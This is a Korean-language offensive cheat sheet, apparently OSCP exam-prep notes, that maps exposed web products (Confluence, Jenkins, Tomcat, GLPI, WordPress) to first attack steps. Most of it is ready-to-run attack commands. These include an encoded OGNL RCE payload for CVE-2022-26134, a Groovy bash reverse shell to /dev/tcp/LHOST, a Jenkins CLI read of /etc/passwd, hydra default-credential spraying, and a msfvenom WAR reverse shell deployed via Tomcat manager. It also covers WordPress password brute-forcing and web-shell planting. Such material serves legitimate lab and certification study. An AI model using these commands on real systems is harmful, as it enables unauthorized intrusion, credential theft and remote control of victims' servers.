# 01. 제품 → 첫 수

`$T` 는 [[00. START]] 프리앰블에서 export 됨.
「실사례」가 있는 것은 볼트에서 실제로 그 벡터로 뚫은 박스다. 「없음」은 벡터가 표준적이나 볼트 실사례 없음(`[가정]`).

---

## 0. 웹 포트 뜨면 «무조건» 이것부터 — 예외 없다

제품을 알든 모르든 먼저 돌린다. 이걸 돌려야 제품·버전·숨은 경로가 나온다.
⚠️ **7월 112 실패가 이 지점이다** — feroxbuster를 돌려놓고 결과를 안 읽어 0점. 돌리는 게 아니라 **읽는** 게 핵심.

```bash
# 식별 — 뭐가 떴는지 (헤더 + 기술스택 + 소스 힌트)
whatweb -a3 http://$T/
curl -sI http://$T/
curl -s http://$T/robots.txt
curl -s http://$T/ | grep -iE "generator|powered by|version|login|<title" | head

# 디렉터리·파일 브루트 — 새 탭에서 돌려두고 다른 것 판다
feroxbuster -u http://$T/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -k -t 50 -o ferox-$T.txt
# 확장자까지:
feroxbuster -u http://$T/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -x php,txt,html,bak,zip -k -t 50 -o ferox-files-$T.txt

# vhost — 도메인 힌트(oscp.exam 등) 나오면
# echo "$T domain.name" | sudo tee -a /etc/hosts
# gobuster vhost -u http://$T -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

nikto -h http://$T/ -o nikto-$T.txt      # 느림, 새 탭
```

**결과를 읽는다** — feroxbuster 끝나면 `200`·`301`·`302` 만 추려서 눈으로:
```bash
grep -E "^(200|30[12]|401|403)" ferox-$T.txt | sort -k2 -n
```
- `/admin` `/login` `/wp-admin` `/manager` → 관리 인터페이스. 아래 제품 절로
- `/uploads` `/files` → 업로드 지점
- `/backup` `.bak` `.zip` `.git` → 소스·자격증명 유출
- `/api` `/rest` → 사전인증 정보노출 가능

버전을 잡았으면 **항상** `searchsploit <제품> <버전>` 을 병행한다.

## Confluence  (8090·8095·7990)
```bash
curl -sI http://$T:8090/ ; curl -s http://$T:8090/login.action | grep -io "confluence[^\"<]*version[^\"<]*"
```
- 기본: admin:admin
- **CVE-2022-26134** OGNL 사전인증 RCE (~7.18.0). **CVE-2023-22515** Broken Access(권한상승).
```bash
curl -s "http://$T:8090/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%29%29%7D/" -o /dev/null -w "%{http_code}\n"
# 통하면 → 리버스셸로: exec 인자를 base64 bash -i 로 교체
searchsploit confluence
```
실사례: 없음 `[가정]`

## Jenkins  (8080·8081·50000)
```bash
curl -s http://$T:8080/login | grep -i jenkins ; curl -sI http://$T:8080/
```
- 인증 없이 **Script Console** 되면 즉시 RCE: `/script`
```groovy
r=Runtime.getRuntime().exec(["bash","-c","bash -i >& /dev/tcp/LHOST/443 0>&1"] as String[])
```
- 안 되면 → **CVE-2024-23897** 파일 읽기(`@` 인자), 기본 자격증명, `/asynchPeople/` 유저 열거
```bash
java -jar jenkins-cli.jar -s http://$T:8080/ connect-node @/etc/passwd 2>&1 | head
```
실사례: 없음 `[가정]`

## Tomcat  (8080·8443·8009)
```bash
curl -su tomcat:tomcat http://$T:8080/manager/text/list ; curl -sI http://$T:8080/
```
- 기본 자격증명 스프레이: tomcat:tomcat · admin:admin · tomcat:s3cret · admin:tomcat
```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \
  $T -s 8080 http-get /manager/html
```
- manager 뚫리면 → war 웹셸 배포:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o shell.war
curl -su tomcat:PASS -T shell.war "http://$T:8080/manager/text/deploy?path=/shell"
curl http://$T:8080/shell/     # 트리거 (nc 리스너 먼저)
```
- 8009 AJP 열렸으면 → **CVE-2020-1938 Ghostcat** LFI
실사례: [[Algernon]] · [[Flu]] · [[Codo]]

## GLPI  (80·8080)
```bash

```
- 기본 4쌍(정확히): glpi:glpi · tech:tech · normal:normal · post-only:postonly (admin:admin 아님)
- **CVE-2022-35914** htmlawed 사전인증 RCE:
```bash

```
- **CVE-2023-46818** SQLi→PHP injection (post-only:postonly 로그인 후)
실사례: [[GLPI]] · [[CVE-2023-46818]] · [[BossPlayersCTF]]

## WordPress  (80·443)
```bash
wpscan --url http://$T/ --enumerate u,vp,vt --no-banner            # --api-token TOKEN 있으면 추가
curl -s http://$T/wp-json/wp/v2/users | grep -o '"slug":"[^"]*"'   # 유저 열거
```
- 유저 확보 → 비번 브루트(xmlrpc 가 빠름):
```bash
wpscan --url http://$T/ -U users.txt -P /usr/share/wordlists/rockyou.txt
```
- admin 로그인 후 → 테마 편집기(Appearance→Theme Editor)에 PHP 웹셸, 또는 플러그인 업로드
- **취약 플러그인 우선** — `wp-content/plugins/` 경로가 wpscan/searchsploit 핵심
실사례: [[Astronaut]] · [[Breakout]]
